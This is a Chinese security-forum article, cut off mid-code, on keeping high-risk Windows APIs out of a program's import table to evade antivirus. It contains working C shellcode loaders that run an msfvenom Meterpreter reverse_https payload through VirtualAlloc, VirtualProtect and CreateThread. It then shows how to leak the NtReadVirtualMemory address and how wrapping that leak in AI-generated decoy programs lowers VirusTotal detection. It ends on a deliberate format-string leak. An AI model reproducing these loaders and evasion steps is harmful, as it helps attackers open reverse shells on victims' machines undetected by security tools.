---
title: 利用NtReadVirtualMemory实现IAT中规避高危API
url: https://forum.butian.net/share/4500
source: 奇安信攻防社区
date: 2025-08-21
fetch_date: 2025-10-07T00:12:38.343270
---

# 利用NtReadVirtualMemory实现IAT中规避高危API

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 利用NtReadVirtualMemory实现IAT中规避高危API

* [安全工具](https://forum.butian.net/topic/53)

前世
Win32 API
Win32 API实现最简单的Shellcode Loader如下，代码中包含注释，可以看到每条语句的含义
#include &amp;lt;windows.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
// msfvenom -p...

前世
==
Win32 API
---------
Win32 API实现最简单的Shellcode Loader如下，代码中包含注释，可以看到每条语句的含义
```php
#include <windows.h>
#include <stdio.h>
// msfvenom -p windows/meterpreter/reverse\_https lhost=xxx lport=xxx -f c
unsigned char shellcode[] =
"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52"
...
"\x30\x2e\x32\x00\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";
int main()
{
// 分配内存
LPVOID allocatedMemory = VirtualAlloc(NULL, sizeof(shellcode), MEM\_COMMIT | MEM\_RESERVE, PAGE\_READWRITE);
if (allocatedMemory == NULL) {
printf("[-] VirtualAlloc failed. Error: %d\n", GetLastError());
return -1;
}
// 拷贝内存
CopyMemory(allocatedMemory, shellcode, sizeof(shellcode));
// 修改内存属性
DWORD oldProtect;
if (!VirtualProtect(allocatedMemory, sizeof(shellcode), PAGE\_EXECUTE\_READWRITE, &oldProtect)) {
printf("[-] VirtualProtect failed. Error: %d\n", GetLastError());
return -1;
}
// 创建线程执行
HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD\_START\_ROUTINE)allocatedMemory, NULL, 0, NULL);
if (hThread == NULL) {
printf("[-] CreateThread failed. Error: %d\n", GetLastError());
return -1;
}
// 等待线程完成
WaitForSingleObject(hThread, INFINITE);
CloseHandle(hThread);
return 0;
}
```
上述代码编译执行后，Meterpreter可成功收到反连，如下图
![01.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/07/attach-d62af1adab48d75b48c2c61e6a3920f255b8ca03.png)
通过[PE-bear](https://github.com/hasherezade/pe-bear)查看，可以看到IAT中存在之前用到的几个Win32 API，如下图
![02.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/07/attach-0616173797771e13bd423f3fea927394f060bbf7.png)
LoadLibrary、GetProcAddress
--------------------------
然后进化出通过LoadLibrary、GetProcAddress实现的动态API调用，代码中包含注释，可以看到每条语句的含义
```php
#include <Windows.h>
#include <stdio.h>
// msfvenom -p windows/meterpreter/reverse\_https lhost=xxx lport=xxx -f c
unsigned char buf[] =
"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52"
...
"\x30\x2e\x32\x00\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";
int main()
{
// 载入kernel32.dll
HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
if (!hKernel32) {
printf("LoadLibraryA failed. Error: %d", GetLastError());
return -1;
}
// 声明一个函数指针，指定调用约定、参数、返回值符合VirtualAlloc的原型
LPVOID (WINAPI \*pVirtualAlloc)(LPVOID, SIZE\_T, DWORD, DWORD) = (LPVOID (WINAPI\*)(LPVOID, SIZE\_T, DWORD, DWORD))GetProcAddress(hKernel32, "VirtualAlloc");
// 声明一个函数指针，指定调用约定、参数、返回值符合RtlMoveMemory的原型
VOID (WINAPI \*pRtlMoveMemory)(VOID UNALIGNED\*, const VOID UNALIGNED\*, SIZE\_T) = (VOID (WINAPI\*)(VOID UNALIGNED\*, const VOID UNALIGNED\*, SIZE\_T))GetProcAddress(hKernel32, "RtlMoveMemory");
// 声明一个函数指针，指定调用约定、参数、返回值符合VirtualProtect的原型
BOOL (WINAPI \*pVirtualProtect)(LPVOID, SIZE\_T, DWORD, PDWORD) = (BOOL (WINAPI\*)(LPVOID, SIZE\_T, DWORD, PDWORD))GetProcAddress(hKernel32, "VirtualProtect");
// 声明一个函数指针，指定调用约定、参数、返回值符合CreateThread的原型
HANDLE (WINAPI \*pCreateThread)(LPSECURITY\_ATTRIBUTES, SIZE\_T, LPTHREAD\_START\_ROUTINE, LPVOID, DWORD, LPDWORD) =
(HANDLE (WINAPI\*)(LPSECURITY\_ATTRIBUTES, SIZE\_T, LPTHREAD\_START\_ROUTINE, LPVOID, DWORD, LPDWORD))GetProcAddress(hKernel32, "CreateThread");
// 声明一个函数指针，指定调用约定、参数、返回值符合WaitForSingleObject的原型
DWORD (WINAPI \*pWaitForSingleObject)(HANDLE, DWORD) = (DWORD (WINAPI\*)(HANDLE, DWORD))GetProcAddress(hKernel32, "WaitForSingleObject");
// 声明一个函数指针，指定调用约定、参数、返回值符合CloseHandle的原型
BOOL (WINAPI \*pCloseHandle)(HANDLE) = (BOOL (WINAPI\*)(HANDLE))GetProcAddress(hKernel32, "CloseHandle");
// 如果哪一个句柄值为false，表示获取失败，程序退出
if (!pVirtualAlloc || !pRtlMoveMemory || !pVirtualProtect || !pCreateThread || !pWaitForSingleObject || !pCloseHandle) {
printf("GetProcAddress failed. Error: %d", GetLastError);
return -1;
}
// 分配内存
LPVOID allocatedMemory = pVirtualAlloc(NULL, sizeof(buf), MEM\_COMMIT | MEM\_RESERVE, PAGE\_READWRITE);
// 拷贝内存
pRtlMoveMemory(allocatedMemory, buf, sizeof(buf));
// 修改内存属性
DWORD oldProtect;
if (!pVirtualProtect(allocatedMemory, sizeof(buf), PAGE\_EXECUTE\_READWRITE, &oldProtect)) {
printf("VirtualProtect failed. Error: %d", GetLastError);
return -1;
}
// 创建线程执行内存
HANDLE hThread = pCreateThread(NULL, 0, (LPTHREAD\_START\_ROUTINE)allocatedMemory, NULL, 0, NULL);
if (hThread == NULL) {
printf("CreateThread failed. Error: %d", GetLastError);
return -1;
}
// 等待线程完成
pWaitForSingleObject(hThread, INFINITE);
pCloseHandle(hThread);
}
```
上述代码编译执行后，Meterpreter可成功收到反连，如下图
![03.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/07/attach-13f37aa26cb49fb3333e6eeb8d497fdb6b9c741d.png)
通过[PE-bear](https://github.com/hasherezade/pe-bear)查看，可以看到IAT中不再有之前的几个Win32 API，仅有LoadLibrary、GetProcAddress，如下图
![04.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/07/attach-ebb666b018c9533f2a3b80aa41ded6ac707a36b1.png)
再进化后，当今动态获取函数地址主流的方式是查询PEB和EAT，这样在IAT中连GetModuleHandle、GetProcAddress也不会出现，甚至还可以遍历内存，通过特征匹配定位函数，进而动态获取函数地址，不过今天要分享的是一个好玩的东西，通过故意泄露内存地址，然后通过NtReadVirtualMemory读取内存来获取函数地址
今生
==
resolve.c
---------
首先我们有这样一个工具[resolve.c](https://github.com/ybdt/evasion-hub/blob/master/01-%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80%E5%AE%9A%E4%BD%8D/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E9%AB%98%E7%BA%A7%E6%8A%80%E6%9C%AF%E4%B9%8B%E5%88%A9%E7%94%A8NtReadVirtualMemory%E5%AE%9E%E7%8E%B0IAT%E4%B8%AD%E8%A7%84%E9%81%BF%E9%AB%98%E5%8D%B1API/resolve.c)，传入NtReadVirtualMemory的地址、DLL名称、函数名称后，可以计算出函数地址
代码比较多我就不贴出来了，基本原理是通过Native API解析PE及PEB，进而获取DLL基址和函数地址，展开讲的话内容比较多，由于不是本篇文章的重点，先不去细究
VS2022下编译后，用法如下图
![09.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/07/attach-13db31d9f63c40db3bb857b9a0fcfd89ccd61ed5.png)
接下来的问题是如何获得NtReadVirtualMemory的地址
方式1 直接输出
--------
```php
#include <windows.h>
#include <stdio.h>
int main() {
HMODULE hNtdll = LoadLibraryA("ntdll.dll");
FARPROC pNtReadVirtualMemory = GetProcAddress(hNtdll, "NtReadVirtualMemory");
printf("[+] NtReadVirtualMemory address: \t0x%p\n", pNtReadVirtualMemory);
return 0;
}
```
编译后执行如下
![05.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/07/attach-614e99c5d5128307864ae1969b451aff844872d3.png)
将Leak-1.exe传到VT上，可以看到是11/72的检测率
![06.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/07/attach-a116ea7745bfe21e8b76f16306f6d2aa2bb7b474.png)
上面的代码太少了，很容易被检测，我们用AI生成一个C++实现的200行的任务管理器，并将上面的代码插入其中，当输入我们自定义的z时，会输出NtReadVirtualMemory的地址
![07.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/07/attach-e85268a188a79deb7e21f08823b946a8890684ca.png)
将Leak-2.exe传到VT上，可以看到是5/72的检测率，检测率降低了将近一半
![08.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/07/attach-e5cdf1fbd527e812b0bfc023b9c2bb028e821d37.png)
尝试用AI生成别的程序，包括涉及进程管理的控制台任务管理器、涉及文件操作的控制台学生成绩管理系统、甚至不涉及进程管理和文件操作的数学运算、C语言版本、C++版本、加上元数据，传到VT上后，至少会有2个杀毒引擎检测到，实在无奈
不过，尽管VT上显示Microsoft将其标识为恶意的，但在本地Defender中，并不会查杀
![10.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/07/attach-ac2cbf12ef37715e6196c733cb6e37a7223f07ce.png)
方式2 格式化字符串漏洞
------------
下述代码是一个典型的格式化字符串漏洞，使用sprintf将格式化数据写入input时，由于没有指定变量，所以会随机打印栈上的值，其中就包括上面定义的leakme1的值，也就造成了内存地址泄露
```php
#include <windows.h>
#include <stdio.h>
int main() {
HMODULE hNtdll = LoadLibraryA("ntdll.dll");
FARPROC pNtReadVirtualMemory = GetProcAddress(hNtdll, "NtReadVirtualMemory");
long long leakme1 = (long long) pNtReadVirtualMemory;
char input[100];
sprintf(input, "%p %p %p ...